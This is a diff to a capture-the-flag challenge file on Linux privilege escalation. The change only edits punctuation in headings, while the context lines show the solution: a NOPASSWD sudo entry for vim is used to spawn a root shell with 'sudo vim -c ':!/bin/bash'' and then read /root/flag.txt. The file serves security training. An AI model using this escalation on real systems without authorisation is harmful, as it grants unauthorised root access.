@@ -1,4 +1,4 @@
-# Challenge 2 — Sudo Misconfiguration
+# Challenge 2  Sudo Misconfiguration
 
 **Difficulty:** Easy  
 **Category:** Linux Privilege Escalation  
@@ -52,9 +52,9 @@ Look up the binary you found on GTFOBins (https://gtfobins.github.io) under the 
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Check sudo rights
+### Step 1  Check sudo rights
 
 ```bash
 sudo -l
@@ -65,7 +65,7 @@ Output:
 (root) NOPASSWD: /usr/bin/vim
 ```
 
-### Step 2 — Use vim to spawn a root shell
+### Step 2  Use vim to spawn a root shell
 
 ```bash
 sudo vim -c ':!/bin/bash'
@@ -74,7 +74,7 @@ sudo vim -c ':!/bin/bash'
 `-c` runs a vim command immediately. `:!` executes a shell command from inside vim.
 Because vim is running as root, `/bin/bash` opens as root.
 
-### Step 3 — Read the flag
+### Step 3  Read the flag
 
 ```bash
 cat /root/flag.txt
